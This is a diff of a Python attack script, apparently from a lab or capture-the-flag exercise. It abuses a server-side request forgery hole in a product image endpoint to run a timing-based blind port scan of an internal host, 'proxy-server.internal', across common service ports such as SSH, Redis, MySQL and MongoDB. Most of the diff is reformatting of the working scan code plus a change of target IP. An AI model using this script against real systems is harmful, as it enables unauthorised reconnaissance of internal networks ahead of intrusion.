@@ -3,35 +3,36 @@ import time
 import requests
 from urllib.parse import quote
 
-SSRF_ENDPOINT = "http://172.19.254.42/product/image?url={}"
+SSRF_ENDPOINT = "http://192.168.68.4/product/image?url={}"
 TARGET_HOST = "proxy-server.internal"
 
 PORTS = [
-        21,    # FTP
-        22,    # SSH
-        25,    # SMTP
-        53,    # DNS
-        80,    # HTTP
-        110,   # POP3
-        143,   # IMAP
-        443,   # HTTPS
-        445,   # SMB
-        3000,  # Dev-Web
-        3306,  # MySQL
-        5000,  # Dev-Web
-        5432,  # PostgreSQL
-        6379,  # Redis
-        8000,  # HTTP-Web
-        8080,  # HTTP-alt
-        8081,  # HTTP-alt
-        8888,
-        9000,
-        9200,  # Elasticsearch
-        11211, # Memcached,
-        27017, # mongoDB
-        ]
+    21,  # FTP
+    22,  # SSH
+    25,  # SMTP
+    53,  # DNS
+    80,  # HTTP
+    110,  # POP3
+    143,  # IMAP
+    443,  # HTTPS
+    445,  # SMB
+    3000,  # Dev-Web
+    3306,  # MySQL
+    5000,  # Dev-Web
+    5432,  # PostgreSQL
+    6379,  # Redis
+    8000,  # HTTP-Web
+    8080,  # HTTP-alt
+    8081,  # HTTP-alt
+    8888,
+    9000,
+    9200,  # Elasticsearch
+    11211,  # Memcached,
+    27017,  # mongoDB
+]
 
 RETRIES = 5
+
 
 def blind_ssrf_port(port):
     times = []
@@ -45,10 +46,10 @@ def blind_ssrf_port(port):
 
         try:
             r = requests.get(
-                    url,
-                    timeout=5,
-                    allow_redirects=False,
-                    )
+                url,
+                timeout=5,
+                allow_redirects=False,
+            )
 
             elapsed = time.perf_counter() - start
 
@@ -66,14 +67,15 @@ def blind_ssrf_port(port):
 
     return statistics.median(times), statuses
 
+
 for port in PORTS:
     median_time, statuses = blind_ssrf_port(port)
 
     print(
-            f"{TARGET_HOST}:{port:<5} "
-            f"median={median_time:.3f}s "
-            f"result={','.join(statuses)}"
-            )
+        f"{TARGET_HOST}:{port:<5} "
+        f"median={median_time:.3f}s "
+        f"result={','.join(statuses)}"
+    )
 
 """
 for port in PORTS:
